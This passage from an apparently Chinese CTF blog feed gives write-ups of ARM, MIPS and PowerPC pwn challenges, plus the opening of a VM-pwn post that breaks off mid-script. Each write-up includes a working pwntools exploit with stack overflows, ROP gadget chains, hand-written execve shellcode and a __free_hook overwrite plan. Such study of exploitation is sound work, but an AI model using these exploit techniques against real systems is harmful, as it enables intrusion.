class="code"><pre><span class="line">.fini:000105C0 08 80 BD E8                   POP     &#123;R3,PC&#125;  </span><br></pre></td></tr></table></figure><p>于是我们可以直接在bss段上写shellcode并执行</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.binary=<span class="string">&#x27;./wARMup&#x27;</span></span><br><span class="line"><span class="comment">#p=process([&#x27;qemu-arm&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;-L&#x27;,&#x27;/usr/arm-linux-gnueabihf&#x27;,&#x27;./wARMup&#x27;])</span></span><br><span class="line">p=process([<span class="string">&#x27;qemu-arm&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/arm-linux-gnueabihf&#x27;</span>,<span class="string">&#x27;./wARMup&#x27;</span>])</span><br><span class="line"></span><br><span class="line">read=<span class="number">0x10530</span></span><br><span class="line">bss=<span class="number">0x21034</span></span><br><span class="line">pop_r3_pc=<span class="number">0x10364</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">100</span>+p32(bss+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload+=p32(pop_r3_pc)+p32(bss)+p32(read)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.send(p32(bss)+p32(bss+<span class="number">8</span>)+asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里有一个比较奇怪的点是,如果在调试模式下read的第二参数必须是bss+4才能正常写入到bss处起始</p><p>但直接执行模式下,又必须是bss</p><h1 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h1><h2 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h2><p>mips下的利用需要注意几点</p><ol><li>MIPS32 架构中是没有 EBP 寄存器的，程序函数调用的时候是将当前栈指针向下移动 n 比特到该函数的 stack frame 存储组空间，函数返回的时候再加上偏移量恢复栈</li><li>传参过程中，前四个参数a0−a3，多余的会保存在调用函数的预留的栈顶空间内</li><li>MIPS 调用函数时会把函数的返回地址直接存入 $RA 寄存器</li><li>MIPS的特殊性，在函数体中<code>$fp</code>和 <code>$sp</code>是相同的，即都指向栈顶</li><li>由于mips的特殊性,在<strong>ROP过程中非常容易搞出来类似在x86上的<code>jmp esp</code>的指令</strong></li><li>mips本身不支持NX,与arm是因为qemu的关系不同</li></ol><p>最后两条使得ret2shellcode是十分有效的攻击方式</p><h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><h3 id="HWS入营赛题mplogin"><a href="#HWS入营赛题mplogin" class="headerlink" title="HWS入营赛题mplogin"></a>HWS入营赛题mplogin</h3><p>checksec没有任何保护机制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/Mplogin/Mplogin&#x27;</span><br><span class="line">    Arch:     mips-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>在sub_400840函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400840</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">24</span>]; <span class="comment">// [sp+18h] [+18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="keyword">sizeof</span>(v1));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[34m&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Username : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v1, <span class="number">24</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(v1, <span class="string">&quot;admin&quot;</span>, <span class="number">5</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Correct name : %s&quot;</span>, v1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strlen</span>(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果v1的长度填满的话那么%s就会把后面的栈地址一起打印出来</p><p>此时就可以泄露栈了</p><p>然后在sub_400978函数中</p><p>存在溢出,覆盖返回地址为栈,ret2shellcode</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">rom pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.binary=<span class="string">&#x27;./Mplogin&#x27;</span></span><br><span class="line"><span class="comment">#p=process([&#x27;qemu-mipsel&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;-L&#x27;,&#x27;/home/aichch/pwn/Mplogin&#x27;,&#x27;./Mplogin&#x27;])</span></span><br><span class="line"></span><br><span class="line">p=process([<span class="string">&#x27;qemu-mipsel&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/home/aichch/pwn/Mplogin&#x27;</span>,<span class="string">&#x27;./Mplogin&#x27;</span>])</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;Username : &#x27;</span>,<span class="string">b&#x27;admin&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">19</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">19</span>)</span><br><span class="line"></span><br><span class="line">stack=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&quot;Pre_Password : &quot;</span>,<span class="string">b&quot;access&quot;</span>.ljust(<span class="number">0x14</span>,<span class="string">b&quot;2&quot;</span>)+p32(<span class="number">0x100</span>))</span><br><span class="line">p.sendafter(<span class="string">b&quot;Password : &quot;</span>,<span class="string">b&quot;0123456789&quot;</span>.ljust(<span class="number">0x28</span>,<span class="string">b&quot;2&quot;</span>)+p32(stack)+asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="HWS结营赛题pwn"><a href="#HWS结营赛题pwn" class="headerlink" title="HWS结营赛题pwn"></a>HWS结营赛题pwn</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  file pwn</span><br><span class="line">pwn: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=e0782ebdf0d70b808dba4b10c6866faeae35c620, not stripped</span><br><span class="line">➜  checksec pwn</span><br><span class="line">    Arch:     mips-32-big</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>MIPS大端，静态链接</p><p>因为这里没有地方泄露栈的地址，所以只能使用ROP来构造类似<code>jmp esp</code>的指令</p><p>在0x004273C4处有一条gadget</p><p><code>addiu $a2,$sp,0x64;  jalr $s0</code></p><p>这个gadget会将$sp寄存器的值加上0x64放到$a2寄存器中，然后跳转到$s0寄存器中的地址去执行。那么如果我们能控制$s0寄存器的值指向一个跳转$a2的gadget,然后在<code>$sp+0x64</code>栈地址上布置shellcode即可利用成功。于是我们需要完成以下操作：</p><ol><li>找到能跳转到$a2的gadget</li><li>控制$s0寄存器到如上gadget</li><li>在<code>$sp+0x64</code>的栈地址上布置shellcode</li></ol><p>可以找到：</p><div class="table-container"><table><thead><tr><th style="text-align:left">Address</th><th style="text-align:left">Action</th><th style="text-align:left">Control Jump</th></tr></thead><tbody><tr><td style="text-align:left">0x00421684</td><td style="text-align:left">move $t9,$a2</td><td style="text-align:left">jr $a2</td></tr></tbody></table></div><p>现在还需要解决一个问题,如何控制$s0？</p><p>这个在前文的MIPS基础知识中提到过，在MIPS的复杂函数的序言和尾声中，会保存和恢复s组寄存器，我们可以下<code>pwn()</code>函数尾声的汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:00400A2C                 move    $sp, $fp</span><br><span class="line">.text:00400A30                 lw      $ra, 0x7C($sp)</span><br><span class="line">.text:00400A34                 lw      $fp, 0x78($sp)</span><br><span class="line">.text:00400A38                 lw      $s7, 0x74($sp)</span><br><span class="line">.text:00400A3C                 lw      $s6, 0x70($sp)</span><br><span class="line">.text:00400A40                 lw      $s5, 0x6C($sp)</span><br><span class="line">.text:00400A44                 lw      $s4, 0x68($sp)</span><br><span class="line">.text:00400A48                 lw      $s3, 0x64($sp)</span><br><span class="line">.text:00400A4C                 lw      $s2, 0x60($sp)</span><br><span class="line">.text:00400A50                 lw      $s1, 0x5C($sp)</span><br><span class="line">.text:00400A54                 lw      $s0, 0x58($sp)</span><br><span class="line">.text:00400A58                 addiu   $sp, 0x80</span><br><span class="line">.text:00400A5C                 jr      $ra</span><br><span class="line">.text:00400A60                 nop</span><br></pre></td></tr></table></figure><p>故我们之前溢出时，在<code>0x90</code>控制了<code>$ra</code>，则我们在<code>0x90-0x7c+0x58=0x6c</code>处，即可控制<code>$s0</code></p><h4 id="布置shellcode"><a href="#布置shellcode" class="headerlink" title="布置shellcode"></a>布置shellcode</h4><p>因为在函数的尾声处会把栈空间收回：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00400A58                 addiu   $sp, 0x80</span><br></pre></td></tr></table></figure><p>故我们控制栈地址到$s2寄存器的值也是回收之后的栈空间，故这个栈空间就是溢出返回地址之后的栈空间，故我们的gadget是<code>$sp+0x64</code>，直接在溢出点后的0x64位置处拼接shellcode即可，故完整exp如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;big&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process([<span class="string">&quot;qemu-mips&quot;</span>,<span class="string">&quot;./pwn&quot;</span>])</span><br><span class="line">io.sendlineafter(<span class="string">&quot;number:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">ra = <span class="number">0x004273C4</span> <span class="comment"># move sp+0x64 to a2 -&gt; jmp s0</span></span><br><span class="line">s0 = <span class="number">0x00421684</span> <span class="comment"># jmp a2                   </span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;1:&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span> + p32(s0) + <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + p32(ra)</span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">0x64</span> + asm(shellcraft.sh())</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Job.&#x27;&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="PowerPC"><a href="#PowerPC" class="headerlink" title="PowerPC"></a>PowerPC</h1><h2 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h2><h3 id="UTCTF2019-PPC"><a href="#UTCTF2019-PPC" class="headerlink" title="UTCTF2019 PPC"></a>UTCTF2019 PPC</h3><p>查看基本信息,发现程序是静态编译且没有任何保护机制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [sp+60h] [-20h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [sp+64h] [-1Ch]</span></span><br><span class="line"></span><br><span class="line">  welcome_0();</span><br><span class="line">  get_input_0();</span><br><span class="line">  v5 = strlen_0(buf_0);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">    buf_0[i] ^= <span class="number">0xCB</span>u;</span><br><span class="line">  printf_0(<span class="string">&quot;%d\n&quot;</span>, v5);</span><br><span class="line">  encrypt_0((<span class="type">char</span> *)v5, v3);</span><br><span class="line">  puts_0(<span class="string">&quot;Exiting..&quot;</span>);</span><br><span class="line">  exit_0(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get_input向bss段上的全局变量buf读取1000个字节</p><p>前面都没有漏洞点,但在encrypt函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">encrypt_0</span><span class="params">(<span class="type">char</span> *block, <span class="type">int</span> edflag)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD v2[<span class="number">2</span>]; <span class="comment">// [sp+60h] [-90h] BYREF</span></span><br><span class="line">  _DWORD v3[<span class="number">32</span>]; <span class="comment">// [sp+68h] [-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">26</span>] = (_DWORD)block;</span><br><span class="line">  memcpy_0(v3, buf_0, <span class="number">0x3E8</span>uLL);</span><br><span class="line">  printf_0(<span class="string">&quot;Here&#x27;s your string: &quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( v2[<span class="number">0</span>] = <span class="number">0</span>; v2[<span class="number">0</span>] &lt;= <span class="number">49</span>; ++v2[<span class="number">0</span>] )</span><br><span class="line">    printf_0(<span class="string">&quot;%x &quot;</span>, *((<span class="type">unsigned</span> __int8 *)&amp;v2[<span class="number">2</span>] + v2[<span class="number">0</span>]));</span><br><span class="line">  putchar_0(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从buf处赋值内存到栈上上,显然发生溢出</p><p>因为没有开启nx,因此直接在buf上写入shellcode,查找溢出长度后直接返回到buf处</p><p>另外为了绕过异或检测,可以shellcode之前填上几个’\0’截断strlen函数</p><p>由于ppc结构没有类似push,pop的操作,所有栈都是由编译器直接指定,所以没办法直接生成getshell的shellcode,需要自己写</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">target = <span class="string">&#x27;ppc&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./&#x27;</span>+target)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor 3,3,3   </span></span><br><span class="line"><span class="string">lis 3, 0x100d  </span></span><br><span class="line"><span class="string">addi 3, 3, 0x2b64</span></span><br><span class="line"><span class="string">xor 4,4,4</span></span><br><span class="line"><span class="string">xor 5,5,5</span></span><br><span class="line"><span class="string">li 0, 11</span></span><br><span class="line"><span class="string">sc</span></span><br><span class="line"><span class="string">.long 0x6e69622f</span></span><br><span class="line"><span class="string">.long 0x68732f</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">rop = p64(<span class="number">0</span>) + shellcode</span><br><span class="line">rop = rop.ljust(<span class="number">152</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">rop += p64(<span class="number">0x100D2B40</span>+<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;string\n&#x27;</span>,rop)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="2021hws-ppppppc"><a href="#2021hws-ppppppc" class="headerlink" title="2021hws-ppppppc"></a>2021hws-ppppppc</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/PPPPPPC&#x27;</span><br><span class="line">    Arch:     powerpc-32-big</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x10000000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>静态编译无任何保护</p><p>去除了符号表,不过可以根据字符串查找到main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_10000464</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v1[<span class="number">308</span>]; <span class="comment">// [sp+8h] [-138h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_100003FC();</span><br><span class="line">  sub_100095B0(<span class="string">&quot;Hello, welcome to hws!&quot;</span>);</span><br><span class="line">  sub_100082D0(<span class="string">&quot;Tell me your name: &quot;</span>);</span><br><span class="line">  sub_10008F40(v1, <span class="number">800</span>, off_100A0E00);</span><br><span class="line">  sub_1001B9B0(&amp;unk_100B3390, v1);</span><br><span class="line">  sub_100095B0(<span class="string">&quot;bye~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现就是就是栈溢出漏洞</p><p>远程环境一定是qemu，直接ret2shellcode,搜索内存发现两段内存里存着发过去的数据，注意要用栈上的shellcode，拷贝到数据段的shellcode会被截断。</p><p>当内存错误时,会打印当前状态,其中包含栈信息,由于是qemu，所以每次不变，故泄露一次，下一次攻击用即可</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;big&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;powerpc&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./PPPPPPC&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r=process([<span class="string">&quot;./qemu-ppc-static&quot;</span>,<span class="string">&quot;./PPPPPPC&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;Tell me your name: &quot;</span>)</span><br><span class="line"></span><br><span class="line">sc = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor 3, 3, 3</span></span><br><span class="line"><span class="string">xor 4, 4, 4</span></span><br><span class="line"><span class="string">xor 5, 5, 5</span></span><br><span class="line"><span class="string">li 0, 11</span></span><br><span class="line"><span class="string">mflr r3</span></span><br><span class="line"><span class="string">addi r3, r3, 7*4</span></span><br><span class="line"><span class="string">sc</span></span><br><span class="line"><span class="string">.long 0x2f62696e</span></span><br><span class="line"><span class="string">.long 0x2f736800</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">r.sendline(sc.ljust(<span class="number">0x13c</span>, <span class="string">b&#x27;\x00&#x27;</span>)+p32(<span class="number">0xf6ffeea0</span>))</span><br><span class="line"><span class="comment"># 0xf6ffed38</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="risc-v"><a href="#risc-v" class="headerlink" title="risc-v"></a>risc-v</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>VMpwn</title>
      <link href="/posts/43000/"/>
      <url>/posts/43000/</url>
      
        <content type="html"><![CDATA[<h1 id="VMpwn"><a href="#VMpwn" class="headerlink" title="VMpwn"></a>VMpwn</h1><p>VM Pwn就是题目自定义了一套指令系统，并且模拟了一套CPU的环境（寄存器、栈、数据缓冲区等结构）需要通过逆向分析题目给定的指令系统,并利用其中的漏洞进行攻击</p><p>大部分漏洞都是<strong><u>数组越界</u></strong>!!</p><p>分析的时候要结合全局分析,先把总体架构搞清楚,如果只看部分很容易懵逼</p><h2 id="OVM"><a href="#OVM" class="headerlink" title="OVM"></a>OVM</h2><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>比较入门的一道vm类题目了</p><p>通过一个数组模拟寄存器</p><p>程序实现了加减乘除左移右移压栈弹栈等操作</p><p>可以自己输入指令起始地址,指令数,栈起始等</p><p>程序的指令都是四字节的</p><p>字节从高到低分别是:指令码,左操作数,右操作数1,右操作数2</p><p>循环主体,不断取出指令下标并判断执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( running )</span><br><span class="line"> &#123;</span><br><span class="line">   v7 = fetch();</span><br><span class="line">   execute(v7);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>利用的漏洞自然是指令没有对下标进行检查,能够覆写很多地方</p><p>在接收到结束指令后会打印所有寄存器的值,此时可以进行泄露</p><p>由于开启了FULL RELRO,因此选择覆写__free_hook</p><p>具体的利用步骤:</p><ol><li>将got表中存储的libc相关地址分块存储到寄存器中,建议泄露stdin三个,距离__free_hook比较近</li><li>通过got表计算得到__free_hook-8的地址(不同libc不同偏移,要根据gdb调试判断)</li><li>覆写comment指针为__free_hook-8</li><li>向comment指针写入binsh字符串,并覆写__free_hook为system的地址</li></ol><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#elf = 